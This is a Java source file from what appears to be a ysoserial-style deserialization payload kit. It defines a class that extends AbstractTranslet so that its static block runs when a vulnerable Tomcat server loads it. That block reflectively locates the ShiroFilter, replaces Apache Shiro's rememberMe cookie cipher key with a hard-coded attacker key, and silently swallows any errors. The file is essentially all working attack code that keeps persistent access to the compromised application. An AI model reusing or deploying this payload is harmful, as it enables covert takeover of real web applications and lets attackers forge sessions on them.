package com.ding0x0.yso.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.shiro.web.mgt.CookieRememberMeManager;
import org.apache.shiro.web.servlet.ShiroFilter;

import javax.servlet.ServletContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class MyShiroModifyKey extends AbstractTranslet {

    static {
        try {
            Class c = Class.forName("org.apache.catalina.core.StandardContext");
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);
            ApplicationFilterConfig config = (ApplicationFilterConfig) filterConfigs.get("ShiroFilter");
            Method getFilter = config.getClass().getDeclaredMethod("getFilter");
            getFilter.setAccessible(true);
            ShiroFilter shiroFilter = (ShiroFilter) getFilter.invoke(config);
            SecurityManager manager = (SecurityManager) shiroFilter.getSecurityManager();
            Field cookie = manager.getClass().getSuperclass().getDeclaredField("rememberMeManager");
            cookie.setAccessible(true);
            CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) cookie.get(manager);
            byte[] key = java.util.Base64.getDecoder().decode("a3dvbmcAAAAAAAAAAAAAAA==");
            cookieRememberMeManager.setDecryptionCipherKey(key);
            cookieRememberMeManager.setEncryptionCipherKey(key);
        }catch (Exception ignore){}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
